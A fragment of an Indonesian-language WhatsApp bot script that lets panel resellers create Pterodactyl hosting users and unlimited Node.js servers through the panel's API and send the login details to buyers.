‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌ _Canda Mas/Mbak Nih Ada Paket Panel_ 📦
* *👤Username :* ${user.username}
* *🔐Password :* ${password.toString()}
* *🔗Link Login :* ${global.domain}

*Note*
- Seller Hanya Memeberikan Data 1×< Hilang? Salah Sendiri
- No Pasang Sc DDoS
- Garansi 15 Hari
- Ambil Garansj Wajib Ss Trx
> *Seller Hanya Memberi Data 1x, Hilang? Salah Sendiri*`
sock.sendMessage(global.panel2[1],{text: teks }, { quoted: m })
}

break; 
        case "unli": {
    if (!prem2 && !isCreator) return m.reply("Maaf Kamu Belum Terdaftar Di Database Resseler Silahkan Untuk Menghubungi Owner")
if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!")
if (!args[0]) return reply(example("nama,6283XXX"))
if (!text.split(",")) return reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return reply(example("nama,6283XXX"))
var ceknya = text.split(",")[1]
if (!ceknya) return reply(example("nama,6283XXX"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await sock.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Tidak Valid!")
global.panel2 = [buyyer, client]
var ram
var disknya
var cpu
ram = "0"
disknya = "0"
cpu = "0"
let username = global.panel2[0].toLowerCase()
let email = username+"@Devil"
let name = username
let password = username + crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
await reply(`*Berhasil Membuat Akun Panel ✅*

* *User ID :* ${user.id}
* *Server ID :* ${server.id}
* *Nama :* ${name} Server
* *Ram :* ${ram == "0" ? "UNLIMITED" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "UNLIMITED" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "UNLIMITED" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
Data Akun Sudah Dikirim Ke Nomor ${global.panel2[1].split('@')[0]}`)
var teks = `Paket Dari ${m.sender}
‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
• Username : ${user.username}
• Password : ${password.toString()}
• Link Login : ${global.domain}`
sock.sendMessage(global.panel2[1],{text: teks }, { quoted: m })
}
break;
default:
}} catch (err) {
console.log('\x1b[1;31m'+err+'\x1b[0m')}}